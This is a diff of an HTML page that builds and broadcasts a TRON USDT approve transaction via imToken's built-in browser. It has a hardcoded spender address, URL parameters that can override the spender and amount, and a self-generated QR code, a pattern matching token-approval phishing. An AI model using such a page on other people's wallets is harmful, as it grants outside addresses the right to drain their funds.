@@ -1,123 +1,137 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="zh-CN">
 <head>
-<meta charset="UTF-8">
-<title>TRON USDT Approve (imToken 原生)</title>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>TRON USDT approve · imToken 内置扫码</title>
 <style>
-  body { font-family: Arial; padding: 20px; max-width: 600px; margin: 0 auto; }
-  .box { border: 1px solid #ccc; padding: 10px; margin-bottom: 10px; background: #f9f9f9; white-space: pre-wrap; word-break: break-all; }
-  label { display: block; margin-top: 10px; font-weight: bold; }
-  input { width: 100%; padding: 8px; margin-top: 5px; box-sizing: border-box; }
-  button { width: 100%; padding: 10px; margin-top: 10px; border: none; color: white; cursor: pointer; }
-  .blue { background: #007bff; }
-  .red { background: #dc3545; }
-  .gray { background: #6c757d; }
+body{font-family:system-ui,Arial;max-width:640px;margin:20px auto;padding:0 16px}
+.box{border:1px solid #ddd;background:#fafafa;padding:10px;border-radius:6px;margin:8px 0;white-space:pre-wrap;word-break:break-all;font-size:13px}
+button{width:100%;padding:10px;margin:6px 0;border:0;border-radius:6px;color:#fff;cursor:pointer}
+.b{background:#1677ff}.r{background:#ff4d4f}.g{background:#888}
+input{width:100%;padding:8px;margin:4px 0;box-sizing:border-box}
+#qr{display:flex;justify-content:center;margin:10px 0}
+.ok{color:#18794e}.bad{color:#b42318}
 </style>
-
-<!-- 1. 引入 Buffer Polyfill (适配器依赖) -->
-<script src="https://cdn.jsdelivr.net/npm/buffer-polyfill@6.0.3/+esm"></script>
-<!-- 2. 引入 TronWeb -->
-<script src="https://cdn.jsdelivr.net/npm/tronweb@5.10.0/dist/TronWeb.min.js"></script>
-<!-- 3. 引入 TronWallet Adapters (包含 imToken 原生适配器 UMD) -->
-<script src="https://cdn.jsdelivr.net/npm/@tronweb3/tronwallet-adapters@latest/dist/umd/index.js"></script>
-
+<!-- 本地优先，CDN兜底 -->
+<script src="./TronWeb.min.js"></script>
+<script>window.TronWeb||document.write('<script src="https://cdn.jsdelivr.net/npm/tronweb@5.10.0/dist/TronWeb.min.js"><\/script>')</script>
+<script src="./qrcode.min.js"></script>
+<script>window.QRCode||document.write('<script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"><\/script>')</script>
 </head>
 <body>
-<h2>TRON USDT Approve (imToken 原生)</h2>
-<div id="status" class="box">初始化...</div>
-<div id="depLog" class="box"></div>
+<h3>TRON USDT approve（imToken 内置浏览器扫码）</h3>
+<div id="dep" class="box">依赖自检中…</div>
+<div id="status" class="box">—</div>
 
-<label>USDT 合约:</label>
-<input id="usdt" value="TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj">
-<label>Spender:</label>
-<input id="spender" value="TGdEJQ9FxioesYuqmWXSBj28qif8ervQ8r">
-<label>额度(USDT):</label>
-<input id="amount" value="1">
+<div id="qr"></div>
+<div class="box">用 imToken「浏览」扫上方二维码，在内置浏览器打开本页后再点授权。</div>
 
-<button class="blue" id="connect">连接 imToken</button>
-<button class="blue" id="approve">发起授权 approve</button>
-<button class="red" id="revoke">撤销授权 (置 0)</button>
-<button class="gray" id="disconnect">断开连接</button>
+<label>USDT 合约</label><input id="usdt" value="TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t">
+<label>Spender（被授权地址）</label><input id="spender" value="TGdEJQ9FxioesYuqmWXSBj28qif8ervQ8r">
+<label>额度（USDT，0=撤销）</label><input id="amt" value="1">
+
+<button class="b" id="approve">发起授权 approve</button>
+<button class="r" id="revoke">撤销授权（置0）</button>
+<button class="g" id="refresh">重新自检/出码</button>
 
 <pre id="log" class="box"></pre>
 
 <script>
-const st = m => document.getElementById('status').innerText = m;
-const log = m => document.getElementById('log').innerText = m;
+const $ = id => document.getElementById(id);
+const st = m => $('status').innerText = m;
+const log = m => $('log').innerText += '\n' + m;
 
-let adapter = null;
-const tw = new TronWeb({ fullHost: 'https://api.trongrid.io' });
+// 用 URL 参数回填，方便二维码带配置
+const Q = new URLSearchParams(location.search);
+if(Q.get('usdt')) $('usdt').value = Q.get('usdt');
+if(Q.get('spender')) $('spender').value = Q.get('spender');
+if(Q.get('amt')) $('amt').value = Q.get('amt');
 
-// 依赖自检
-window.onload = () => {
-  const depMsg = `TronWeb=${typeof TronWeb}\nImTokenAdapter=${typeof window['@tronweb3/tronwallet-adapters']?.ImTokenAdapter}`;
-  document.getElementById('depLog').innerText = depMsg;
-  
-  if (typeof window['@tronweb3/tronwallet-adapters']?.ImTokenAdapter !== 'function') {
-    st('ImTokenAdapter 加载失败，请检查网络或刷新页面');
-    return;
+let tw = null, walletAddr = '', via = '';
+
+function selfCheck(){
+  let msg = '';
+  msg += 'TronWeb=' + (typeof TronWeb) + '\n';
+  msg += 'QRCode=' + (typeof QRCode) + '\n';
+  // imToken/TRON 内置通常注入 window.tronWeb；部分 imToken 场景可用适配器，但这里不依赖
+  const hasInjected = !!(window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58);
+  msg += '注入tronWeb=' + hasInjected + '\n';
+  if(hasInjected){
+    walletAddr = window.tronWeb.defaultAddress.base58;
+    via = 'injected';
+    msg += '已检测到钱包地址: ' + walletAddr + '\n';
+    st('就绪：imToken 已注入，可直接授权');
+  }else{
+    msg += '未检测到注入：说明不在 imToken 内置浏览器，或需先解锁/切到TRON\n';
+    st('未检测到钱包：请先用imToken扫二维码在内置浏览器打开');
   }
-  st('就绪，请点击"连接 imToken"');
-};
+  $('dep').innerHTML = '<span class="' + (hasInjected?'ok':'bad') + '">' + msg.replace(/\n/g,'<br>') + '</span>';
+  return hasInjected;
+}
 
-// 绑定连接事件（必须在用户点击时触发，不能页面加载自动弹）
-document.getElementById('connect').onclick = async () => {
-  try {
-    st('唤起 imToken 中...');
-    // 初始化原生适配器（不需要 projectId，走 DeepLink）
-    const ImTokenAdapter = window['@tronweb3/tronwallet-adapters'].ImTokenAdapter;
-    adapter = new ImTokenAdapter({ openAppWithDeeplink: true });
-    
-    // 连接并获取地址
-    const res = await adapter.connect();
-    const addr = res.address;
-    if (!addr) throw new Error('未获取到地址');
-    
-    st('已连接: ' + addr);
-    log('地址: ' + addr);
-  } catch (e) {
-    st('连接错误: ' + (e.message || e));
-    log('详情: ' + (e.stack || e));
-  }
-};
+function makeTronWeb(){
+  if(window.tronWeb && via==='injected') return window.tronWeb;
+  // 非注入环境只用来组交易/查数据，不持有私钥
+  return new TronWeb({ fullHost: 'https://api.trongrid.io' });
+}
 
-async function doApprove(v) {
-  try {
-    if (!adapter || !adapter.address) throw new Error('请先点击连接 imToken');
-    const addr = adapter.address;
-    const usdt = document.getElementById('usdt').value.trim();
-    const sp = document.getElementById('spender').value.trim();
-    
-    if (isNaN(Number(v)) || Number(v) < 0) throw new Error('额度非法');
-    
-    const base = BigInt(Math.round(Number(v) * 1e6)).toString();
-    st('构造 approve 中...');
-    
-    const { transaction } = await tw.transactionBuilder.triggerSmartContract(
-      usdt, 'approve(address,uint256)',
-      { feeLimit: 100000000, callValue: 0 },
-      [{ type: 'address', value: sp }, { type: 'uint256', value: base }],
-      addr
-    );
-    
-    log('请求 imToken 签名...');
-    const signed = await adapter.signTransaction(transaction);
-    const r = await tw.trx.sendRawTransaction(signed);
-    
-    st('已广播');
-    log('TXID: ' + (r && r.txid ? r.txid : JSON.stringify(r)));
-  } catch (e) {
-    st('错误: ' + (e.message || e));
-    log('详情: ' + (e.stack || e));
+function drawSelfQR(){
+  const u = new URL(location.href);
+  u.searchParams.set('usdt', $('usdt').value.trim());
+  u.searchParams.set('spender', $('spender').value.trim());
+  u.searchParams.set('amt', $('amt').value.trim());
+  $('qr').innerHTML = '';
+  if(window.QRCode){
+    new QRCode($('qr'), {text:u.toString(),width:260,height:260,correctLevel:QRCode.CorrectLevel.H});
   }
 }
 
-document.getElementById('approve').onclick = () => doApprove(document.getElementById('amount').value.trim());
-document.getElementById('revoke').onclick = () => doApprove('0');
-document.getElementById('disconnect').onclick = async () => {
-  try { if (adapter && adapter.disconnect) await adapter.disconnect(); } catch (e) {}
-  st('已断开，请刷新页面重新操作');
-};
+async function doApprove(rawVal){
+  try{
+    const usdt = $('usdt').value.trim();
+    const sp = $('spender').value.trim();
+    let val = String(rawVal).trim();
+    if(val==='' ) val = $('amt').value.trim();
+    if(isNaN(Number(val)) || Number(val)<0) throw new Error('额度非法');
+    const base = BigInt(Math.round(Number(val)*1e6)).toString(); // USDT 6位
+
+    if(!selfCheck()) throw new Error('未检测到imToken注入，无法签名。请扫二维码在imToken内置浏览器打开；或按日志手动授权。');
+
+    const tw = makeTronWeb();
+    const owner = walletAddr || (window.tronWeb.defaultAddress.base58);
+    st('构造 approve…');
+    log('approve('+sp+', '+base+')  owner='+owner);
+
+    const {transaction} = await tw.transactionBuilder.triggerSmartContract(
+      usdt, 'approve(address,uint256)',
+      {feeLimit:100000000, callValue:0},
+      [{type:'address',value:sp},{type:'uint256',value:base}],
+      owner
+    );
+    if(!transaction) throw new Error('构造交易为空');
+
+    st('调用钱包签名…');
+    // 注入环境用 tronWeb.trx.sign；imToken 内部会弹确认
+    const signed = await tw.trx.sign(transaction);
+    st('广播中…');
+    const r = await tw.trx.sendRawTransaction(signed);
+    st('已广播');
+    log('TXID=' + (r&&r.txid?r.txid:JSON.stringify(r)));
+  }catch(e){
+    st('错误：'+(e&&e.message?e.message:e));
+    log('ERR='+(e&&e.stack?e.stack:e));
+    if(!walletAddr){
+      log('手动方案：imToken→对应USDT合约→授权页，spender填上面地址，额度填'+BigInt(Math.round(Number(String(rawVal||$('amt').value).trim())*1e6)).toString()+'（6位小数）；撤销填0。');
+    }
+  }
+}
+
+$('approve').onclick = ()=>doApprove($('amt').value.trim());
+$('revoke').onclick = ()=>doApprove('0');
+$('refresh').onclick = ()=>{ $('log').innerText=''; selfCheck(); drawSelfQR(); };
+
+window.onload = ()=>{ $('log').innerText=''; selfCheck(); drawSelfQR(); };
 </script>
 </body>
 </html>
